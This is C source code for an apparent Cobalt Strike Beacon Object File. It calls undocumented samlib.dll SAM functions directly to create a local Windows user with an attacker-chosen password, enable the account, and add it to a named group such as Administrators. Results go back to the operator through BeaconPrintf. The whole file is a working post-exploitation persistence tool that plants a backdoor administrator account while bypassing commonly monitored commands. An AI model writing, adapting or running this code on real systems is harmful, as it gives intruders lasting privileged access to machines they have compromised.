#include <windows.h>
#include "beacon.h"

WINBASEAPI HMODULE WINAPI LoadLibraryA (LPCSTR lpLibFileName);
WINBASEAPI FARPROC WINAPI GetProcAddress (HMODULE hModule, LPCSTR lpProcName);

#define USER_ALL_ACCESS					0x000f07ff
#define USER_ALL_NTPASSWORDPRESENT		0x01000000
#define USER_ALL_USERACCOUNTCONTROL		0x00100000
#define DOMAIN_CREATE_USER				0x00000010
#define DOMAIN_LOOKUP					0x00000200
#define DOMAIN_READ_PASSWORD_PARAMETERS	0x00000001
#define SAM_SERVER_CONNECT				0x00000001
#define SAM_SERVER_LOOKUP_DOMAIN		0x00000020
#define SAM_SERVER_ENUMERATE_DOMAINS	0x00000010
#define USER_NORMAL_ACCOUNT				0x00000010
#define STATUS_MORE_ENTRIES             0x00000105
#define ALIAS_ADD_MEMBER				0x00000001
#define STATUS_USER_EXISTS				0xC0000063L

#define NT_SUCCESS(Status) ((NTSTATUS)(Status) >= 0)

typedef struct _UNICODE_STRING {
	USHORT Length;
	USHORT MaximumLength;
	PWSTR Buffer;
} UNICODE_STRING, *PUNICODE_STRING;
typedef const UNICODE_STRING* PCUNICODE_STRING;
typedef struct _STRING {
	USHORT Length;
	USHORT MaximumLength;
	PCHAR Buffer;
} STRING, *PSTRING;
typedef UNICODE_STRING LSA_UNICODE_STRING, *PLSA_UNICODE_STRING;


typedef PVOID	SAMPR_HANDLE;
typedef PVOID SAM_HANDLE, *PSAM_HANDLE;


typedef enum _USER_INFORMATION_CLASS {
	UserSetPasswordInformation = 15,
	UserInternal1Information = 18,
	UserAllInformation = 21,
} USER_INFORMATION_CLASS, *PUSER_INFORMATION_CLASS;

typedef struct _SR_SECURITY_DESCRIPTOR {
	ULONG Length;
	PUCHAR SecurityDescriptor;
} SR_SECURITY_DESCRIPTOR, *PSR_SECURITY_DESCRIPTOR;

typedef struct _LOGON_HOURS {
	USHORT UnitsPerWeek;
	PUCHAR LogonHours;

} LOGON_HOURS, *PLOGON_HOURS;

typedef struct _SAMPR_RID_ENUMERATION {
	DWORD RelativeId;
	LSA_UNICODE_STRING Name;
} SAMPR_RID_ENUMERATION, *PSAMPR_RID_ENUMERATION;


typedef struct _USER_ALL_INFORMATION {
	LARGE_INTEGER LastLogon;
	LARGE_INTEGER LastLogoff;
	LARGE_INTEGER PasswordLastSet;
	LARGE_INTEGER AccountExpires;
	LARGE_INTEGER PasswordCanChange;
	LARGE_INTEGER PasswordMustChange;
	UNICODE_STRING UserName;
	UNICODE_STRING FullName;
	UNICODE_STRING HomeDirectory;
	UNICODE_STRING HomeDirectoryDrive;
	UNICODE_STRING ScriptPath;
	UNICODE_STRING ProfilePath;
	UNICODE_STRING AdminComment;
	UNICODE_STRING WorkStations;
	UNICODE_STRING UserComment;
	UNICODE_STRING Parameters;
	UNICODE_STRING LmPassword;
	UNICODE_STRING NtPassword;
	UNICODE_STRING PrivateData;
	SR_SECURITY_DESCRIPTOR SecurityDescriptor;
	ULONG UserId;
	ULONG PrimaryGroupId;
	ULONG UserAccountControl;
	ULONG WhichFields;
	LOGON_HOURS LogonHours;
	USHORT BadPasswordCount;
	USHORT LogonCount;
	USHORT CountryCode;
	USHORT CodePage;
	BOOLEAN LmPasswordPresent;
	BOOLEAN NtPasswordPresent;
	BOOLEAN PasswordExpired;
	BOOLEAN PrivateDataSensitive;
} USER_ALL_INFORMATION, *PUSER_ALL_INFORMATION;


typedef NTSTATUS(WINAPI* _SamConnect)(IN PUNICODE_STRING ServerName, OUT SAMPR_HANDLE * ServerHandle, IN ACCESS_MASK DesiredAccess, IN BOOLEAN Trusted);
typedef NTSTATUS(WINAPI* _SamOpenDomain)(IN SAMPR_HANDLE SamHandle, IN ACCESS_MASK DesiredAccess, IN PSID DomainId, OUT SAMPR_HANDLE * DomainHandle);
typedef NTSTATUS(WINAPI* _SamCreateUser2InDomain)(_In_ SAM_HANDLE DomainHandle, _In_ PUNICODE_STRING AccountName, _In_ ULONG AccountType, _In_ ACCESS_MASK DesiredAccess, _Out_ PSAM_HANDLE UserHandle, _Out_ PULONG GrantedAccess, _Out_ PULONG RelativeId);
typedef NTSTATUS(WINAPI* _SamSetInformationUser)(_In_ SAM_HANDLE UserHandle, _In_ USER_INFORMATION_CLASS UserInformationClass, _In_ PVOID Buffer);
typedef NTSTATUS(WINAPI* _SamQuerySecurityObject)(_In_ SAM_HANDLE ObjectHandle, _In_ SECURITY_INFORMATION SecurityInformation, _Outptr_ PSECURITY_DESCRIPTOR *SecurityDescriptor);
typedef NTSTATUS(WINAPI* _SamAddMemberToAlias)(_In_ SAM_HANDLE AliasHandle, _In_ PSID MemberId);
typedef NTSTATUS(WINAPI* _SamEnumerateDomainsInSamServer)(IN SAMPR_HANDLE ServerHandle, OUT DWORD * EnumerationContext, OUT PSAMPR_RID_ENUMERATION* Buffer, IN DWORD PreferedMaximumLength, OUT DWORD * CountReturned);
typedef NTSTATUS(WINAPI* _SamLookupDomainInSamServer)(IN SAMPR_HANDLE ServerHandle, IN PUNICODE_STRING Name, OUT PSID * DomainId);
typedef NTSTATUS(WINAPI* _SamLookupNamesInDomain)(IN SAMPR_HANDLE DomainHandle, IN DWORD Count, IN PUNICODE_STRING Names, OUT PDWORD * RelativeIds, OUT DWORD * Use);
typedef NTSTATUS(WINAPI* _SamOpenAlias)(IN SAMPR_HANDLE DomainHandle, IN ACCESS_MASK DesiredAccess, IN DWORD AliasId, OUT SAMPR_HANDLE * AliasHandle);
typedef NTSTATUS(WINAPI* _SamRidToSid)(IN SAMPR_HANDLE ObjectHandle, IN DWORD Rid, OUT PSID * Sid);
typedef NTSTATUS(WINAPI* _SamCloseHandle)(IN SAMPR_HANDLE SamHandle);
typedef NTSTATUS(WINAPI* _SamFreeMemory)(IN PVOID Buffer);

typedef NTSTATUS(WINAPI* _RtlInitUnicodeString)(PUNICODE_STRING DestinationString,PCWSTR SourceString);
typedef BOOLEAN(WINAPI* _RtlEqualUnicodeString)(IN PCUNICODE_STRING String1, IN PCUNICODE_STRING String2, IN BOOLEAN CaseInSensitive);

void AddUserBySAMR(PCWSTR name, PCWSTR pass, PCWSTR group){
    UNICODE_STRING UserName;
	UNICODE_STRING PassWord;
	UNICODE_STRING uBuiltin;
	UNICODE_STRING serverName;

	UNICODE_STRING adminGroup;
	SAMPR_HANDLE hAdminGroup;
	DWORD* adminRID;
	DWORD USE = 0;
	PSID userSID = NULL;
	HANDLE hServerHandle = NULL;
	HANDLE DomainHandle = NULL;
	HANDLE UserHandle = NULL;
	ULONG GrantedAccess;
	ULONG RelativeId;
	NTSTATUS Status = NULL;
	NTSTATUS enumDomainStatus = NULL;
	HMODULE hSamlib = NULL;
	HMODULE hNtdll = NULL;

	USER_ALL_INFORMATION uai = { 0 };
	DWORD i, domainEnumerationContext = 0, domainCountReturned;
	PSAMPR_RID_ENUMERATION pEnumDomainBuffer = NULL, pEnumGroupBuffer = NULL;
	PSID builtinDomainSid = 0, accountDomainSid = 0;


	hSamlib = LoadLibraryA("samlib.dll");
	hNtdll = LoadLibraryA("ntdll.dll");
    _SamConnect SamConnect = (_SamConnect)GetProcAddress(hSamlib, "SamConnect");
	_SamOpenDomain SamOpenDomain = (_SamOpenDomain)GetProcAddress(hSamlib, "SamOpenDomain");
    _SamCreateUser2InDomain SamCreateUser2InDomain = (_SamCreateUser2InDomain)GetProcAddress(hSamlib, "SamCreateUser2InDomain");
	_SamSetInformationUser SamSetInformationUser = (_SamSetInformationUser)GetProcAddress(hSamlib, "SamSetInformationUser");
	_SamQuerySecurityObject SamQuerySecurityObject = (_SamQuerySecurityObject)GetProcAddress(hSamlib, "SamQuerySecurityObject");
	_SamEnumerateDomainsInSamServer SamEnumerateDomainsInSamServer = (_SamEnumerateDomainsInSamServer)GetProcAddress(hSamlib, "SamEnumerateDomainsInSamServer");
	_SamAddMemberToAlias SamAddMemberToAlias = (_SamAddMemberToAlias)GetProcAddress(hSamlib, "SamAddMemberToAlias");
	_SamLookupDomainInSamServer SamLookupDomainInSamServer = (_SamLookupDomainInSamServer)GetProcAddress(hSamlib, "SamLookupDomainInSamServer");
	_SamLookupNamesInDomain SamLookupNamesInDomain = (_SamLookupNamesInDomain)GetProcAddress(hSamlib, "SamLookupNamesInDomain");
	_SamOpenAlias SamOpenAlias = (_SamOpenAlias)GetProcAddress(hSamlib, "SamOpenAlias");
	_SamRidToSid SamRidToSid = (_SamRidToSid)GetProcAddress(hSamlib, "SamRidToSid");
	_SamCloseHandle SamCloseHandle = (_SamCloseHandle)GetProcAddress(hSamlib, "SamCloseHandle");
	_SamFreeMemory SamFreeMemory = (_SamFreeMemory)GetProcAddress(hSamlib, "SamFreeMemory");

	_RtlInitUnicodeString RtlInitUnicodeString = (_RtlInitUnicodeString)GetProcAddress(hNtdll, "RtlInitUnicodeString");
	_RtlEqualUnicodeString RtlEqualUnicodeString = (_RtlEqualUnicodeString)GetProcAddress(hNtdll, "RtlEqualUnicodeString");

    RtlInitUnicodeString(&uBuiltin, L"Builtin");
	RtlInitUnicodeString(&UserName, name);
	RtlInitUnicodeString(&PassWord, pass);
	RtlInitUnicodeString(&serverName, L"localhost");
	RtlInitUnicodeString(&adminGroup, group);

    Status = SamConnect(&serverName, &hServerHandle, SAM_SERVER_CONNECT | SAM_SERVER_ENUMERATE_DOMAINS | SAM_SERVER_LOOKUP_DOMAIN, FALSE);
	
	if (NT_SUCCESS(Status)) {
		do
		{
			enumDomainStatus = SamEnumerateDomainsInSamServer(hServerHandle, &domainEnumerationContext, &pEnumDomainBuffer, 1, &domainCountReturned);
			for (i = 0; i < domainCountReturned; i++)
			{
				// Get Builtin Domain SID & Account Domain SID
				if (RtlEqualUnicodeString(&pEnumDomainBuffer[i].Name, &uBuiltin, TRUE))
					SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &builtinDomainSid);
				else
					SamLookupDomainInSamServer(hServerHandle, &pEnumDomainBuffer[i].Name, &accountDomainSid);
			}


		} while (enumDomainStatus == STATUS_MORE_ENTRIES);

		Status = SamOpenDomain(hServerHandle, DOMAIN_CREATE_USER | DOMAIN_LOOKUP | DOMAIN_READ_PASSWORD_PARAMETERS, accountDomainSid, &DomainHandle);

		// Create user in Account Domain
		if (NT_SUCCESS(Status)) {
			Status = SamCreateUser2InDomain(DomainHandle, &UserName, USER_NORMAL_ACCOUNT, USER_ALL_ACCESS | DELETE | WRITE_DAC, &UserHandle, &GrantedAccess, &RelativeId);
			if (NT_SUCCESS(Status)) {
                BeaconPrintf(CALLBACK_OUTPUT, "SamCreateUser2InDomain success.\n");
                BeaconPrintf(CALLBACK_OUTPUT, "User RID: %d\n",RelativeId);
				uai.NtPasswordPresent = TRUE;
				uai.WhichFields |= USER_ALL_NTPASSWORDPRESENT;
				// Clear the UF_ACCOUNTDISABLE to enable account
				uai.UserAccountControl &= 0xFFFFFFFE;
				uai.UserAccountControl |= USER_NORMAL_ACCOUNT;
				uai.WhichFields |= USER_ALL_USERACCOUNTCONTROL;
				RtlInitUnicodeString(&uai.NtPassword, PassWord.Buffer);

				//Set password and userAccountControl
				Status = SamSetInformationUser(UserHandle, UserAllInformation, &uai);
				if (NT_SUCCESS(Status)) {
                    //BeaconPrintf(CALLBACK_OUTPUT, "SamSetInformationUser success.\n");
                    BeaconPrintf(CALLBACK_OUTPUT, "Add user %S success.\n",name);
				}
				else
                    BeaconPrintf(CALLBACK_ERROR, "SamSetInformationUser error 0x%08X\n", Status);
			}
			else if (Status == STATUS_USER_EXISTS) {
                BeaconPrintf(CALLBACK_ERROR, "SamCreateUser2InDomain STATUS_USER_EXISTS: 0x%08X\n", Status);
                return;

			}else
                BeaconPrintf(CALLBACK_ERROR, "SamCreateUser2InDomain error 0x%08X\n", Status);
		}
		else
            BeaconPrintf(CALLBACK_ERROR, "SamOpenDomain error. 0x%0X8\n", Status);

		Status = SamOpenDomain(hServerHandle, DOMAIN_LOOKUP, builtinDomainSid, &DomainHandle);
		if (NT_SUCCESS(Status)) {
			// Lookup Administrators in Builtin Domain
			Status = SamLookupNamesInDomain(DomainHandle, 1, &adminGroup, &adminRID, &USE);
			if (NT_SUCCESS(Status)) {
				Status = SamOpenAlias(DomainHandle, ALIAS_ADD_MEMBER, *adminRID, &hAdminGroup);
				if (NT_SUCCESS(Status)) {
					SamRidToSid(UserHandle, RelativeId, &userSID);
					// Add user to Administrators
					Status = SamAddMemberToAlias(hAdminGroup, userSID);
					if (NT_SUCCESS(Status))
					{
                        //BeaconPrintf(CALLBACK_OUTPUT, "SamAddMemberToAlias success\n.");
                        BeaconPrintf(CALLBACK_OUTPUT, "Add %S to *%S success.\n",name,group);
					}
					else
                        BeaconPrintf(CALLBACK_ERROR, "AddMemberToAlias error 0x%08X\n", Status);

				}else
                    BeaconPrintf(CALLBACK_ERROR, "SamOpenAlias error 0x%08X\n", Status);
			}else
                BeaconPrintf(CALLBACK_ERROR, "SamLookupNamesInDomain error 0x%08X\n", Status);
		}else
            BeaconPrintf(CALLBACK_ERROR, "SamOpenDomain error. 0x%0X8\n", Status);

	}else
        BeaconPrintf(CALLBACK_ERROR, "Samconnect error. 0x%0X8\n", Status);

	SamCloseHandle(UserHandle);
	SamCloseHandle(DomainHandle);
	SamCloseHandle(hServerHandle);
	SamFreeMemory(pEnumDomainBuffer);
	SamFreeMemory(pEnumGroupBuffer);
}

void go(IN PCHAR Buffer, IN ULONG Length) {

	if(!BeaconIsAdmin()){
           BeaconPrintf(CALLBACK_OUTPUT,"You must be a admin for this to work");
           return;
    }

    //beacon arg vars
	PCWSTR userName = NULL;
	PCWSTR passWord = NULL;
    PCWSTR group = NULL;

	//Parse Beacon args
	datap parser;
	BeaconDataParse(&parser, Buffer, Length);
	userName = BeaconDataExtract(&parser, NULL);
	passWord = BeaconDataExtract(&parser, NULL);
    group = BeaconDataExtract(&parser, NULL);

    AddUserBySAMR(userName,passWord,group);

}